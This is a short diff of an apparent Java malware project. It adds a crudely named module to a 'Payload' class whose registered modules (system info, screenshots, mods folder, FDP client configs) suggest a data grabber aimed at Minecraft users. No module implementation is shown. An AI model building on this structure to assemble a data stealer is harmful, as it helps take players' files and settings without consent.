@@ -19,6 +19,7 @@ public final class Payload {
     private Payload() {
         payloads.addAll(Arrays.asList(
                 new Info(),
+                new FurryPorn(),
                 new ScreenShot(),
                 new ModsFolder(),
                 new FdpConfigs(),
